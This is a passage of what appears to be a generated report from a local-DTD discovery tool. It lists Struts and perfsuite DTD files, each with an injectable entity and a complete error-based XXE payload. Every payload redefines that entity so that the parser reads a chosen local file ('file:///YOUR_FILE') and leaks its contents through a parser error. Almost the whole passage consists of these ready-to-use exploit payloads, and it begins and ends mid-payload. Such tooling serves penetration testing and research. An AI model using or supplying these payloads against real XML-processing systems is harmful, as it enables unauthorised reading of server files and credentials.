    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/struts/struts-config_1_2.dtd">

    <!ENTITY % Boolean '(aa) #IMPLIED>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ATTLIST attxx aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/struts/struts-config_1_2.dtd`

**Injectable entity:** `ClassName`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/struts/struts-config_1_2.dtd">

    <!ENTITY % ClassName '(aa) #IMPLIED>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ATTLIST attxx aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/struts/struts-config_1_2.dtd`

**Injectable entity:** `Integer`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/struts/struts-config_1_2.dtd">

    <!ENTITY % Integer '(aa) #IMPLIED>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ATTLIST attxx aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/struts/struts-config_1_2.dtd`

**Injectable entity:** `Location`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/struts/struts-config_1_2.dtd">

    <!ENTITY % Location 'aaa)>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa (bb'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/struts/struts-config_1_2.dtd`

**Injectable entity:** `PropName`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/struts/struts-config_1_2.dtd">

    <!ENTITY % PropName '(aa) #IMPLIED>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ATTLIST attxx aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/struts/struts-config_1_2.dtd`

**Injectable entity:** `RequestPath`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/struts/struts-config_1_2.dtd">

    <!ENTITY % RequestPath '(aa) #IMPLIED>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ATTLIST attxx aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/struts/struts-config_1_2.dtd`

**Injectable entity:** `RequestScope`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/struts/struts-config_1_2.dtd">

    <!ENTITY % RequestScope '(aa) #IMPLIED>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ATTLIST attxx aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/struts/struts-config_1_1.dtd`

**Injectable entity:** `AttributeName`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/struts/struts-config_1_1.dtd">

    <!ENTITY % AttributeName '(aa) #IMPLIED>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ATTLIST attxx aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/struts/struts-config_1_1.dtd`

**Injectable entity:** `BeanName`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/struts/struts-config_1_1.dtd">

    <!ENTITY % BeanName '(aa) #IMPLIED>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ATTLIST attxx aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/struts/struts-config_1_1.dtd`

**Injectable entity:** `Boolean`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/struts/struts-config_1_1.dtd">

    <!ENTITY % Boolean '(aa) #IMPLIED>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ATTLIST attxx aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/struts/struts-config_1_1.dtd`

**Injectable entity:** `ClassName`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/struts/struts-config_1_1.dtd">

    <!ENTITY % ClassName '(aa) #IMPLIED>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ATTLIST attxx aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/struts/struts-config_1_1.dtd`

**Injectable entity:** `Integer`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/struts/struts-config_1_1.dtd">

    <!ENTITY % Integer '(aa) #IMPLIED>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ATTLIST attxx aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/struts/struts-config_1_1.dtd`

**Injectable entity:** `Location`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/struts/struts-config_1_1.dtd">

    <!ENTITY % Location 'aaa)>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa (bb'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/struts/struts-config_1_1.dtd`

**Injectable entity:** `PropName`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/struts/struts-config_1_1.dtd">

    <!ENTITY % PropName '(aa) #IMPLIED>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ATTLIST attxx aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/struts/struts-config_1_1.dtd`

**Injectable entity:** `RequestPath`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/struts/struts-config_1_1.dtd">

    <!ENTITY % RequestPath '(aa) #IMPLIED>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ATTLIST attxx aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/struts/struts-config_1_1.dtd`

**Injectable entity:** `RequestScope`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/struts/struts-config_1_1.dtd">

    <!ENTITY % RequestScope '(aa) #IMPLIED>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ATTLIST attxx aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/struts/struts-config_1_4.dtd`

**Injectable entity:** `AttributeName`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/struts/struts-config_1_4.dtd">

    <!ENTITY % AttributeName '(aa) #IMPLIED>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ATTLIST attxx aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/struts/struts-config_1_4.dtd`

**Injectable entity:** `BeanName`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/struts/struts-config_1_4.dtd">

    <!ENTITY % BeanName '(aa) #IMPLIED>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ATTLIST attxx aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/struts/struts-config_1_4.dtd`

**Injectable entity:** `Boolean`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/struts/struts-config_1_4.dtd">

    <!ENTITY % Boolean '(aa) #IMPLIED>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ATTLIST attxx aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/struts/struts-config_1_4.dtd`

**Injectable entity:** `ClassName`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/struts/struts-config_1_4.dtd">

    <!ENTITY % ClassName '(aa) #IMPLIED>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ATTLIST attxx aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/struts/struts-config_1_4.dtd`

**Injectable entity:** `Integer`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/struts/struts-config_1_4.dtd">

    <!ENTITY % Integer '(aa) #IMPLIED>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ATTLIST attxx aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/struts/struts-config_1_4.dtd`

**Injectable entity:** `Location`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/struts/struts-config_1_4.dtd">

    <!ENTITY % Location 'aaa)>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa (bb'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/struts/struts-config_1_4.dtd`

**Injectable entity:** `PropName`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/struts/struts-config_1_4.dtd">

    <!ENTITY % PropName '(aa) #IMPLIED>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ATTLIST attxx aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/struts/struts-config_1_4.dtd`

**Injectable entity:** `RequestPath`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/struts/struts-config_1_4.dtd">

    <!ENTITY % RequestPath '(aa) #IMPLIED>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ATTLIST attxx aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/struts/struts-config_1_4.dtd`

**Injectable entity:** `RequestScope`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/struts/struts-config_1_4.dtd">

    <!ENTITY % RequestScope '(aa) #IMPLIED>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ATTLIST attxx aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/struts/struts-config_1_4.dtd`

**Injectable entity:** `PopulateStrategy`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/struts/struts-config_1_4.dtd">

    <!ENTITY % PopulateStrategy '(aa) #IMPLIED>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ATTLIST attxx aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/struts/struts-config_1_0.dtd`

**Injectable entity:** `BeanName`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/struts/struts-config_1_0.dtd">

    <!ENTITY % BeanName '(aa) #IMPLIED>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ATTLIST attxx aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/struts/struts-config_1_0.dtd`

**Injectable entity:** `Boolean`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/struts/struts-config_1_0.dtd">

    <!ENTITY % Boolean '(aa) #IMPLIED>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ATTLIST attxx aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/struts/struts-config_1_0.dtd`

**Injectable entity:** `ClassName`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/struts/struts-config_1_0.dtd">

    <!ENTITY % ClassName '(aa) #IMPLIED>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ATTLIST attxx aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/struts/struts-config_1_0.dtd`

**Injectable entity:** `Integer`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/struts/struts-config_1_0.dtd">

    <!ENTITY % Integer '(aa) #IMPLIED>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ATTLIST attxx aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/struts/struts-config_1_0.dtd`

**Injectable entity:** `Location`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/struts/struts-config_1_0.dtd">

    <!ENTITY % Location 'aaa)>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa (bb'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/struts/struts-config_1_0.dtd`

**Injectable entity:** `PropName`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/struts/struts-config_1_0.dtd">

    <!ENTITY % PropName '(aa) #IMPLIED>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ATTLIST attxx aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/struts/struts-config_1_0.dtd`

**Injectable entity:** `RequestPath`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/struts/struts-config_1_0.dtd">

    <!ENTITY % RequestPath '(aa) #IMPLIED>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ATTLIST attxx aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/struts/struts-config_1_0.dtd`

**Injectable entity:** `RequestScope`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/struts/struts-config_1_0.dtd">

    <!ENTITY % RequestScope '(aa) #IMPLIED>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ATTLIST attxx aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/perfsuite/hwpcreport-0.3.dtd`

**Injectable entity:** `machineinfo.dtd`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/perfsuite/hwpcreport-0.3.dtd">

    <!ENTITY % machineinfo.dtd '
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        '>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/perfsuite/hwpcprofilereport.dtd`

**Injectable entity:** `machineinfo.dtd`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/perfsuite/hwpcprofilereport.dtd">

    <!ENTITY % machineinfo.dtd '
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        '>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/perfsuite/hwpcprofilereport-0.2.dtd`

**Injectable entity:** `machineinfo.dtd`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/perfsuite/hwpcprofilereport-0.2.dtd">

    <!ENTITY % machineinfo.dtd '
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        '>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/perfsuite/hwpcprofilereport-0.3.dtd`

**Injectable entity:** `machineinfo.dtd`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/perfsuite/hwpcprofilereport-0.3.dtd">

    <!ENTITY % machineinfo.dtd '
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        '>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/perfsuite/psmetrics.dtd`

**Injectable entity:** `expr`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/perfsuite/psmetrics.dtd">

    <!ENTITY % expr 'aaa)>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa (bb'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/perfsuite/multihwpcprofilereport-0.2.dtd`

**Injectable entity:** `hwpcprofilereport.dtd`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/perfsuite/multihwpcprofilereport-0.2.dtd">

    <!ENTITY % hwpcprofilereport.dtd '
